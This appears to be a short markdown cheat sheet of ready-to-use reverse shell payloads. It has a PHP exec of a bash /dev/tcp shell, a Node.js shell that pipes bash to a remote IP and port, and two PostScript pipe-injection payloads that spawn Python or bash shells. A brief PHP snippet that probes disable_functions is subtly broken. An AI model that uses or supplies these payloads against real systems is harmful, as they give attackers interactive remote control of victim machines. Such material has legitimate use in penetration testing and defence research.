# Reverse shells
## PHP Reverse Shell
```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'");
```
- [PHP Reverse Shell](php_rev_shell.php)
- [Powny Reverse Shell](powny-shell.php)

## Javascript Reverse Shell
```js
var spawn = require('child_process').spawn;
var net = require('net');
var reconnect = require('reconnect');

reconnect(function (stream) {
    var ps = spawn('bash', [ '-i' ]);
    stream.pipe(ps.stdin);
    ps.stdout.pipe(stream, { end: false });
    ps.stderr.pipe(stream, { end: false });
    ps.on('exit', function () { stream.end() });
}).connect(<port>, '<ip>');
```

## Postscript Reverse Shell
```ps
%!PS
userdict /setpagedevice undef
legal
{ null restore } stopped { pop } if
legal
mark /OutputFile (%pipe%python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ip>",<port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);') currentdevice putdeviceprops
```

```ps
%!PS
userdict /setpagedevice undef
legal
{ null restore } stopped { pop } if
legal
mark /OutputFile (%pipe%bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1') currentdevice putdeviceprops
```

## PHP RCE
```php
<?php var_dump(explode('.'.ini_get('disable_functions')));?>
```
   
## This is where you can get more reverse shell
***https://gtfobins.github.io***
